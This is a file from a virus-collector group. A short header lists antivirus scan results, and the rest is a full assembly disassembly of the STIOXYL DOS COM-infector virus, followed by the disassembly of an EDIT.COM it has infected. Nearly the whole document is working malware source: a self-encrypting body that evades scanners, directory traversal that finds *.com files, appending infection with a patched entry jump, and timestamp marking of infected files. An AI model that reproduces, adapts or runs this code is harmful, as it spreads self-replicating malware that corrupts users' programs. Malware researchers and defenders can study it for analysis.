   ;
   ;           ÛÛÛÛÛÛÛ     Û        Û  ÛÛÛÛÛÛÛÛÛ  Û ÛÛÛÛÛÛÛÛ
   ;          Û       Û    Û        Û  Û          ÛÛÛ     ÛÛ
   ;         Û         Û   Û        Û  Û          Û       ÛÛ
   ;         ÛÛÛÛÛÛÛÛÛÛÛ   Û        Û  Û          Û
   ;         Û         Û   Û        Û  Û          Û
   ;         Û         Û    Û      Û   Û          Û
   ;         Û         Û     ÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ  Û
   ;
   ;
   ;
   ;       ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   Û      Û  ÛÛÛÛÛ   Û    Û    ÛÛÛÛÛ    Û
   ;       Û    Û       Û  Û      Û  Û    Û  ÛÛ   Û   Û     Û   Û
   ;       Û    Û       Û  Û      Û  ÛÛÛÛÛ   Û Û  Û  Û       Û  Û
   ;       Û     Û    Û       Û  Û      Û  Û  Û    Û  Û Û  ÛÛÛÛÛÛÛÛÛ  Û
   ;       Û     Û    Û       Û  Û      Û  Û   Û   Û   ÛÛ  Û       Û  Û
   ;        ÛÛÛÛÛ      ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   Û    Û  Û    Û  Û       Û  ÛÛÛÛÛÛ
   ;
   ;
   ;        Distributed By The American Virus Creation and Research Society
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Name Of Virus:  STIOXYL
   ; -----------------------------------------------------------------------------
   ; Alias:
   ; -----------------------------------------------------------------------------
   ; Type Of Code:  COM Infector
   ; -----------------------------------------------------------------------------
   ; VSUM Information - (NONE)
   ; -----------------------------------------------------------------------------
   ; Signature:
   ; 4F 2E 43 4F 4D B9 FF
   ; -----------------------------------------------------------------------------
   ; Antivirus Detection:
   ; (1)
   ; ThunderByte Anti Virus (TBAV) reported STIOXYL.COM as:
   ;     C:\STIOXYL\STIOXYL.COM
   ;      probably infected by an unknown virus
   ;     c  No checksum / recovery information (Anti-Vir.Dat) available.
   ;     F  Suspicious file access.  Might be able to infect a file.
   ;     S  Contains a routine to search for executable (.COM or .EXE) files.
   ;     G  Garbage instructions.  Contains code that seems to have no purpose
   ;        other than encryption or avoiding recognition by virus scanners.
   ;     O  Found code that can be used to overwrite/move a program in memory.
   ;
   ; (2)
   ; Frisk Software's F-Protect (F-PROT) reported STIOXYL.COM as nothing.
   ;
   ; (3)
   ; McAfee Softwares Anti Virus (SCAN.EXE) reported STIOXYL.COM as nothing.
   ;
   ; (4)
   ; MicroSoft Anti Virus (MSAV.EXE) reported STIOXYL.COM as nothing.
   ; -----------------------------------------------------------------------------
   ; Execution Results:
   ;   When STIOXYL.COM was run the COMMAND.COM was changed from:
   ; COMMAND.COM    6:20:20   09-30-1993   54619    0080
   ; COMMAND.COM    6:20:21   09-30-1993   54619    0080
   ;   The Dos EDIT.COM was also changed from:
   ; EDIT.COM       6:20:20   09-30-1993   413      0104
   ; EDIT.COM       6:20:21   09-30-1993   803      03CD
   ; -----------------------------------------------------------------------------
   ; Researcher's Note:
   ;   The STIOXYL.COM virus is by no means stealth.  The virus infects
   ; the COMMAND.COM and the EDIT.COM files at the first running.  They show
   ; the infection by date change and size change.
   ; -----------------------------------------------------------------------------
   ;
   ;           Complete Disassembly

           PAGE    60,132


   data_28a        =       28Ah
   data_29f        =       29Fh
   data_2a0        =       2A0h
   data_2a4        =       2A4h
   data_2a8        =       2A8h
   data_2b6        =       2B6h


   ;ÄÄÄÄÄÄÄÄÄÄ CODE_SEG_1  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   CODE_SEG_1      segment para public
           assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1


           org     100h


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              ENTRY POINT
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_start
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_start      proc    far
   start:          ; N-Ref=0
           add     Byte Ptr [BX+SI],AL
           add     Byte Ptr [BX+SI],AL
           mov     SP,102h
           call    near ptr proc_1
   proc_start      endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_1
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_1          proc    near
           mov     BP,Word Ptr var1_100    ; [6352:0100] = 0
           mov     SP,0FFFEh
           sub     BP,offset proc_1
           mov     AX,305h
           xor     BX,BX
           int     16h                     ; BIOS Service func ( ah ) = 3
                           ; Keyboard service
           call    near ptr proc_3
           jmp     short loc_2
   proc_1          endp



   var1_121        dw      0

   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_2
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_2          proc    near
           call    near ptr proc_3
           mov     AH,40h                  ; '@'
           mov     CX,186h
           lea     DX,Word Ptr var1_104[BP]; Load effective address
           int     21h                     ; DOS func ( ah ) = 40h
                           ; Write to file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
           call    near ptr proc_3
           retn
   proc_2          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_3
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_3          proc    near
           mov     AX,Word Ptr var1_121[BP]
           lea     SI,Word Ptr var1_147[BP]; Load effective address
           mov     CX,0A2h
   loop_loc_1:             ; N-Ref=1
           xor     Word Ptr [SI],AX
           inc     SI
           inc     SI
           loop    loop_loc_1              ; Loop if CX > 0
           retn
   proc_3          endp


   loc_2:          ; N-Ref=1
           mov     AH,19h
           int     21h                     ; DOS func ( ah ) = 19h
                           ; Report current drive
                           ;AL-default drive code
           cmp     AL,2
           jb      loc_6                   ; Jump if below ( < )
           mov     AH,47h                  ; 'G'
           xor     DL,DL
           lea     SI,Word Ptr [BP+2B6h]   ; Load effective address
           int     21h                     ; DOS func ( ah ) = 47h
                           ; Get current directory
                           ;DL-drive ID
                           ; DS:SI-ptr to data area
                           ;if CF=1 AX-ret code, else
                           ; DS:SI-full path name
           lea     SI,Word Ptr var1_287[BP]; Load effective address
           mov     DI,offset var1_100
           movsw                           ; Move word from DS:SI to ES:DI
           movsb                           ; Move byte from DS:SI to ES:DI
           lea     DX,Word Ptr [BP+28Ah]   ; Load effective address
           mov     AH,1Ah
           int     21h                     ; DOS func ( ah ) = 1Ah
                           ; Set disk transfer area
                           ;DS:DX-pointer to DTA
           lea     DX,Word Ptr var1_26d[BP]; Load effective address
           call    near ptr proc_5
   loc_3:          ; N-Ref=1
           mov     AH,4Eh                  ; 'N'
           mov     CX,7
           lea     DX,Word Ptr var1_27b[BP]; Load effective address
   loc_4:          ; N-Ref=1
           int     21h                     ; DOS func ( ah ) = 4Eh
                           ; FIND FIRST: Start file search
                           ;CX-attr to search on
                           ; DS:DX-ASCIIZ string
                           ;if CF=1 AX-ret code
           jb      loc_5                   ; Jump if below ( < )
           call    near ptr proc_4
           mov     AH,4Fh                  ; 'O'
           jmp     short loc_4
   loc_5:          ; N-Ref=1
           mov     AH,3Bh                  ; ';'
           lea     DX,Word Ptr var1_281[BP]; Load effective address
           int     21h                     ; DOS func ( ah ) = 3Bh
                           ; CHDIR: Change directory
                           ;DS:DX-ASCIIZ string
                           ;AX-ret code if CF set
           jnb     loc_3                   ; Jump if not below ( >= )
           mov     AH,3Bh                  ; ';'
           lea     DX,Word Ptr [BP+2B6h]   ; Load effective address
           int     21h                     ; DOS func ( ah ) = 3Bh
                           ; CHDIR: Change directory
                           ;DS:DX-ASCIIZ string
                           ;AX-ret code if CF set
           mov     DX,80h
           mov     AH,1Ah
           int     21h                     ; DOS func ( ah ) = 1Ah
                           ; Set disk transfer area
                           ;DS:DX-pointer to DTA
   loc_6:          ; N-Ref=1
           mov     DI,offset var1_100
           push    DI
           retn

   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_4
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_4          proc    near
           lea     DX,Word Ptr [BP+2A8h]   ; Load effective address

   ;ÍÍÍÍÍÍÍÍÍÍ External Entry into current procedure  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   proc_5:
           mov     AX,4301h
           xor     CX,CX
           int     21h                     ; DOS func ( ah ) = 43h
                           ; CHMOD:Get/set file attributes
                           ;AL-(0/1)get/set code CX-attrib
                           ; DS:DX-ASCIIZ string
                           ;if CF=1 AX-ret code
                           ; CX-attrib if set used
           mov     AX,3D02h
           int     21h                     ; DOS func ( ah ) = 3Dh
                           ; Open file
                           ;CX-acsess code
                           ;  DS:DX-ASCIIZ string
                           ;AX-file handle
                           ; if CF=1 AX-error code
           jnb     loc_7                   ; Jump if not below ( >= )
           retn
   loc_7:          ; N-Ref=1
           xchg    BX,AX
           mov     AX,5700h
           int     21h                     ; DOS func ( ah ) = 57h
                           ; Get/set file date and time
                           ;AL-(0/1)get/set flag BX-handle
                           ; CX/DX-time/date,if AL=1
                           ;if CF=1 AX-extended err code
                           ; CX/DX-time/date if AL=0
           push    DX
           push    CX
           mov     AH,3Fh                  ; '?'
           mov     CX,3
           lea     DX,Word Ptr var1_287[BP]; Load effective address
           int     21h                     ; DOS func ( ah ) = 3Fh
                           ; Read from file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
           mov     AX,Word Ptr [BP+2A0h]
           and     AL,1Fh
           cmp     AL,15h
           je      loc_9                   ; Jump if equal ( = )
           cmp     Byte Ptr var1_288[BP],0F7h
           je      loc_9                   ; Jump if equal ( = )
           cmp     Byte Ptr var1_288[BP],6Dh       ; 'm'
           je      loc_9                   ; Jump if equal ( = )
           mov     AX,Word Ptr [BP+2A4h]
           cmp     AX,312h
           jb      loc_9                   ; Jump if below ( < )
           cmp     AX,0FE77h
           jnbe    loc_9                   ; Jump if above ( > )
           mov     AX,4202h
           xor     CX,CX
           cwd                             ; Convert word to dword
           int     21h                     ; DOS func ( ah ) = 42h
                           ; Move file pointer
                           ;AL-method code BX-file handle
                           ; CX_DX-offset value
                           ;if CF=1 AX-ret code
                           ; DX_AX-new ptr location
           sub     AX,3
           mov     Word Ptr var1_285[BP],AX
   loc_8:          ; N-Ref=1
           mov     AH,2Ch                  ; ','
           int     21h                     ; DOS func ( ah ) = 2Ch
                           ; Get time
                           ;CL-min CH-hours DH-seconds
                           ; DL-1/100 of secs
           je      loc_8                   ; Jump if equal ( = )
           mov     Word Ptr var1_121[BP],DX
           call    near ptr proc_2
           mov     AX,4200h
           xor     CX,CX
           cwd                             ; Convert word to dword
           int     21h                     ; DOS func ( ah ) = 42h
                           ; Move file pointer
                           ;AL-method code BX-file handle
                           ; CX_DX-offset value
                           ;if CF=1 AX-ret code
                           ; DX_AX-new ptr location
           mov     AH,40h                  ; '@'
           mov     CX,3
           lea     DX,Word Ptr var1_284[BP]; Load effective address
           int     21h                     ; DOS func ( ah ) = 40h
                           ; Write to file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
   loc_9:          ; N-Ref=5
           mov     AX,5701h
           pop     CX
           pop     DX
           and     CL,0E0h
           or      CL,15h
           int     21h                     ; DOS func ( ah ) = 57h
                           ; Get/set file date and time
                           ;AL-(0/1)get/set flag BX-handle
                           ; CX/DX-time/date,if AL=1
                           ;if CF=1 AX-extended err code
                           ; CX/DX-time/date if AL=0
           mov     AH,3Eh                  ; '>'
           int     21h                     ; DOS func ( ah ) = 3Eh
                           ; Close file handle
                           ;BX-file handle
                           ;if CF=1 AX-ret code
           mov     AX,4301h
           xor     CH,CH
           lea     DX,Word Ptr [BP+2A8h]   ; Load effective address
           mov     CL,Byte Ptr [BP+29Fh]
           int     21h                     ; DOS func ( ah ) = 43h
                           ; CHMOD:Get/set file attributes
                           ;AL-(0/1)get/set code CX-attrib
                           ; DS:DX-ASCIIZ string
                           ;if CF=1 AX-ret code
                           ; CX-attrib if set used
           retn
   proc_4          endp



   var1_23f        db      '[Stioxyl] (c) ''94 The Unforgiven/Immortal Riot'
   var1_26d        db      '\DOS\EDIT.COM'
           db      0
   var1_27b        db      '*.com'
           db      0
   var1_281        db      2Eh, 2Eh, 0
   var1_284        db      0E9h
   var1_285        dw      9090h
   var1_287        db      90h
   var1_288        db      0CDh, 20h
   CODE_SEG_1      ends



           end     start




          EDIT.COM After Being Infected by STIOXYL Virus:




           PAGE    60,132


   data_2          =       2
   data_2c         =       2Ch
   data_100        =       100h
   data_121        =       121h
   data_147        =       147h


   ;ÄÄÄÄÄÄÄÄÄÄ CODE_SEG_1  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   CODE_SEG_1      segment para public
           assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1


           org     100h


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              ENTRY POINT
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_start
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_start      proc    far
   start:          ; N-Ref=0
           jmp     loc_14

           dw      0E38Bh, 0C383h, 0D10Fh, 0D1EBh
           dw      0D1EBh, 0D1EBh, 0B4EBh, 0CD4Ah
           dw      0BA21h, 246h, 373h, 0A2E9h
           dw      8C00h, 0A3C8h, 28Ah, 80A0h
           dw      3C00h, 0BA49h, 25Dh, 0EE77h
           dw      8B98h, 41C8h, 805h, 9000h
           dw      94A2h, 0BE02h, 81h, 9CBFh
           dw      0F302h, 0A1A4h, 2Ch, 0C08Eh
           dw      0FF33h, 0C033h, 6C7h, 283h
           dw      0FFFFh
   loc_1:          ; N-Ref=2
           mov     CX,5
           nop                             ; No operation
           mov     SI,offset var1_27e
           repz    cmpsb                   ; Repeat if ZF = 1, CX > 0
                           ; Cmp byte at DS:SI to ES:DI
           jne     loc_2                   ; Jump if not equal ( != )
           mov     Word Ptr var1_283,DI    ; [6352:0283] = 0
   loc_2:          ; N-Ref=1
           dec     DI
           mov     CX,8000h
           repnz   scasb                   ; Repeat if ZF = 0, CX > 0
                           ; Scan DS:SI for byte in AL
           cmp     Byte Ptr ES:[DI],AL
           jne     loc_1                   ; Jump if not equal ( != )
           inc     DI
           scasw                           ; Scan DS:SI for word in AX
           mov     SI,DI
           mov     DI,offset var1_2e4
           push    ES
           pop     DS
           push    CS
           pop     ES
           mov     AH,30h                  ; '0'
           int     21h                     ; DOS func ( ah ) = 30h
                           ; Get DOS version number
                           ;AL/AH-major/minor ver number
           mov     BX,DI
           cmp     AL,3
           jb      loc_6                   ; Jump if below ( < )
   loc_3:          ; N-Ref=1
           lodsb                           ; Load byte at DS:SI to AL
           stosb                           ; Store AL at ES:DI
           cmp     AL,5Ch                  ; '\'
           je      loc_4                   ; Jump if equal ( = )
           cmp     AL,2Fh                  ; '/'
           je      loc_4                   ; Jump if equal ( = )
           cmp     AL,3Ah                  ; ':'
           jne     loc_5                   ; Jump if not equal ( != )
   loc_4:          ; N-Ref=2
           mov     BX,DI
   loc_5:          ; N-Ref=1
           or      AL,AL
           jne     loc_3                   ; Jump if not equal ( != )
   loc_6:          ; N-Ref=3
           push    CS
           pop     DS
           cmp     BX,offset var1_2e4
           jne     loc_7                   ; Jump if not equal ( != )
           mov     Byte Ptr var1_285,1     ; [6352:0285] = 0
           nop                             ; No operation
   loc_7:          ; N-Ref=1
           mov     DI,BX
           mov     SI,offset var1_273
           mov     CX,0Bh
           nop                             ; No operation
           repz    movsb                   ; Repeat if ZF = 1, CX > 0
                           ; Move byte from DS:SI to ES:DI
           mov     DX,offset var1_2e4
           mov     BX,offset var1_286
           mov     AX,4B00h
           int     21h                     ; DOS func ( ah ) = 4Bh
                           ; EXEC: Load/execute program
                           ;AL-subfnc DS:DX-ASCIIZ string
                           ; ES:BX-ptr to cntl block
                           ;AX-ret code
           jnb     loc_9                   ; Jump if not below ( >= )
           mov     DX,offset var1_21b
           cmp     AX,8
           jne     loc_10                  ; Jump if not equal ( != )
   loc_8:          ; N-Ref=2
           push    CS
           pop     DS
           mov     AH,9
           int     21h                     ; DOS func ( ah ) = 9
                           ; Display string
                           ;DS:DX-output string
           mov     AX,4CFFh
           int     21h                     ; DOS func ( ah ) = 4Ch
                           ; Terminate process
                           ;AL-ret code
   loc_9:          ; N-Ref=1
           mov     AH,4Dh                  ; 'M'
           int     21h                     ; DOS func ( ah ) = 4Dh
                           ; Get return code of subprogram
                           ;AL-ret code AH-ending code
           mov     AH,4Ch                  ; 'L'
           int     21h                     ; DOS func ( ah ) = 4Ch
                           ; Terminate process
                           ;AL-ret code
   loc_10:         ; N-Ref=1
           cmp     Byte Ptr var1_285,0     ; [6352:0285] = 0
           mov     BX,offset var1_2e4
           je      loc_6                   ; Jump if equal ( = )
           mov     DX,229h
           mov     AX,Word Ptr CS:data_2c  ; [6352:002C] = 4F79h
           mov     DS,AX

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  DS:nothing
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           mov     SI,Word Ptr CS:var1_283 ; [6352:0283] = 0
           cmp     SI,-1
           je      loc_8                   ; Jump if equal ( = )
           push    CS
           pop     ES
           mov     DI,offset var1_2e4
   loc_11:         ; N-Ref=1
           lodsb                           ; Load byte at DS:SI to AL
           stosb                           ; Store AL at ES:DI
           cmp     AL,3Bh                  ; ';'
           je      loc_12                  ; Jump if equal ( = )
           or      AL,AL
           jne     loc_11                  ; Jump if not equal ( != )
           mov     SI,0FFFFh
   loc_12:         ; N-Ref=1
           mov     Word Ptr CS:var1_283,SI ; [6352:0283] = 0
           dec     DI
           mov     AL,5Ch                  ; '\'
           cmp     Byte Ptr ES:[DI-1],AL
           je      loc_13                  ; Jump if equal ( = )
           cmp     Byte Ptr ES:[DI-1],2Fh  ; '/'
           je      loc_13                  ; Jump if equal ( = )
           stosb                           ; Store AL at ES:DI
   loc_13:         ; N-Ref=2
           mov     BX,DI
           jmp     loc_6

   var1_21b        db      'Out of memory$'
   var1_229        db      'Can not find file QBASIC.EXE$'
   var1_246        db      'DOS memory-arena error$'
   var1_25d        db      'Command line too long$'
   var1_273        db      'QBASIC.EXE'
           db      0
   var1_27e        db      'PATH='
   var1_283        dw      0
   var1_285        db      0
   var1_286        db      0, 0, 94h, 2, 0, 0
           db      8 dup (0FFh)
           db      0
   var1_295        db      '/EDCOM '
           db      0
   loc_14:         ; N-Ref=2
           mov     SP,102h
           call    near ptr proc_1
   proc_start      endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_1
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_1          proc    near
           mov     BP,Word Ptr DS:data_100
           mov     SP,0FFFEh
           sub     BP,10Ah
           mov     AX,305h
           xor     BX,BX
           int     16h                     ; BIOS Service func ( ah ) = 3
                           ; Keyboard service
           call    near ptr proc_2
           jmp     short loc_17

           dw      253Eh, 0FE8h, 0B400h, 0B940h
           dw      186h, 968Dh, 104h, 21CDh
   loc_15:         ; N-Ref=0
           call    near ptr proc_2
           retn
   proc_1          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_2
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_2          proc    near
           mov     AX,Word Ptr [BP+121h]
           lea     SI,Word Ptr [BP+147h]   ; Load effective address
           mov     CX,0A2h
   loop_loc_16:            ; N-Ref=1
           xor     Word Ptr [SI],AX
           inc     SI
           inc     SI
           loop    loop_loc_16             ; Loop if CX > 0
           retn
   proc_2          endp


   loc_17:         ; N-Ref=1
           mov     BH,Byte Ptr [SI]

           db      0F3h
   var1_2e3        db      4
   var1_2e4        db      2
   var1_2e5        db      '''Lj'
           db      8Ah, 62h, 0Ch, 0F7h, 0B3h, 93h
           db      88h, 27h, 0F3h, 4, 0B3h, 93h
           db      0B9h, 27h, 81h, 25h, 3Fh, 80h
           db      9Ah, 0A8h, 0A8h, 0AFh, 3Ch, 91h
           db      24h, 0E8h, 1Fh, 0A8h, 0A8h, 48h
           db      3Ch, 0CDh, 8, 25h, 8Ah, 6Bh
           db      87h, 22h, 3Eh, 0A8h, 0A8h, 5Eh
           db      3Ch, 0E8h, 1Fh, 57h, 39h, 0CDh
           db      1Ch, 25h, 8Ah, 6Ah, 0D5h, 0D0h
           db      8Ah, 1Eh, 0B3h, 0B3h, 0BFh, 27h
           db      0F3h, 4, 4Dh, 0C7h, 8Ah, 1Eh
           db      0B3h, 0B3h, 88h, 27h, 0F3h, 4
           db      84h, 0A5h, 3Eh, 91h, 24h, 0E8h
           db      1Fh, 9Ah
           db      '>$i'
           db      0E6h, 0B3h, 0B3h, 96h, 27h, 86h
           db      24h, 7Dh, 16h, 0F7h, 0E8h, 1Fh
           db      9Dh, 3Ch, 18h, 0F3h, 4, 4Dh
           db      24h, 0FDh, 0B6h, 86h, 25h, 69h
           db      0E8h, 1Fh, 77h, 6Fh, 91h, 1
           db      9Ch, 3Dh, 25h, 0B3h, 0B3h, 0B9h
           db      27h, 0F3h, 4, 0B5h, 0A3h, 9Eh
           db      27h, 1Ah, 3Ah, 2
   var1_369        db      '0Jn'
           db      0BEh, 9Bh, 0B6h, 27h, 0C9h, 51h
           db      7Ah, 0A5h, 80h, 0ADh
   var1_376        db      '<HJ'
           db      18h, 0B5h, 0A3h, 9Ah, 27h, 3
   var1_37f        db      '7=W'
           db      0Ah, 18h, 49h, 0DBh, 49h, 0Ah
           db      86h, 27h, 7Ch, 16h, 0F7h, 0BCh
           db      0F3h, 4, 13h, 26h, 3Eh, 0ACh
           db      0B8h, 0A0h, 3Ch, 91h, 12h, 0E8h
           db      1Fh, 51h, 0C4h, 0ACh, 0A8h, 4
           db      3Fh, 0CDh, 26h, 0DAh, 86h, 25h
           db      7Ch, 16h, 0F7h, 0BCh, 0F3h, 4
           db      8Ah, 65h, 87h, 26h, 3Eh, 0A8h
           db      0A8h, 0A1h, 3Ch, 0E8h, 1Fh, 9Dh
   var1_3b8        db      '?rg'
           db      7Fh, 0BEh, 0C4h, 0DEh, 0A5h, 0F7h
           db      30h, 0F3h, 4, 8Ah, 1Bh
   loc_18:         ; N-Ref=0

           dw      2486h, 177Dh, 0A8D3h, 8DA8h
           dw      0AF3Ch, 0BAB0h, 0E83Ch, 0E61Fh
   var1_3d8        db      'evJLQ]GIc'
           db      5, 16h, 46h, 17h, 5, 19h
           db      1Ch, 0Ah, 5
   var1_3ea        db      'jM['
           db      5
   var1_3ee        db      'kKXJLBWS[K'
           db      11h
   var1_3f9        db      'lSHQWJDR'
           db      5
   var1_402        db      'lLQQbaqvb`zlj'
           db      0Bh
   var1_410        db      '}js%'
           db      14h, 0Bh
   var1_416        db      ']JS%'
           db      10h, 0Bh, 3Eh, 0CCh, 0A4h, 24h
           db      85h, 41h, 3Ah
   CODE_SEG_1      ends



           end     start
